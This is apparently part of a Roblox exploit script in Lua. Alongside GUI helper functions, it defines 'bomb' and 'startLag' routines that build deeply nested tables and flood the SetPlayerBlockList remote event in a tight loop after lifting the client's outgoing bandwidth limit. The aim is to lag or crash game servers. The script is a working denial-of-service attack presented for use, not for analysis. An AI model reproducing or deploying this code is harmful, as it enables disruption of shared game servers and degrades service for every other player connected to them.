local function Create(class, props)
	local obj = Instance.new(class)
	for key, value in pairs(props) do
		if key ~= "Parent" then
			obj[key] = value
		end
	end
	if props.Parent then
		obj.Parent = props.Parent
	end
	return obj
end

local function Corner(parent, radius)
	local c = Instance.new("UICorner")
	c.CornerRadius = UDim.new(0, radius or 8)
	c.Parent = parent
	return c
end

local function Stroke(parent, color, thickness)
	local s = Instance.new("UIStroke")
	s.Color = color
	s.Thickness = thickness or 1
	s.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
	s.Parent = parent
	return s
end

local function Tween(obj, properties, duration)
	TweenService:Create(
		obj,
		TweenInfo.new(duration or 0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
		properties
	):Play()
end

local function bomb(poder)
	local main, spam = {}, {{}}
	local z = spam[1]
	for i = 1, 25 do local t = {} table.insert(z, t) z = t end
	local max = math.min(20000, poder * 80)
	for i = 1, max do table.insert(main, spam) end
	pcall(function() game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main) end)
end

local function startLag()
	if State.lagThread then task.cancel(State.lagThread) end
	State.lagThread = task.spawn(function()
		while State.Enabled do
			local preset = State.SelectedPreset
			local poder
			if preset == "CUSTOM" then
				poder = math.floor(State.CustomValue * 2)
			else
				poder = POWER_LEVELS[preset] and POWER_LEVELS[preset].poder or 25
			end
			pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000) end)
			bomb(poder)
			if preset == "ULTRA" then
				task.wait(0.08)
			else
				task.wait(0.18)
			end
		end
	end)
end

local function stopLag()
	if State.lagThread then
		task.cancel(State.lagThread)
		State.lagThread = nil
	end
end

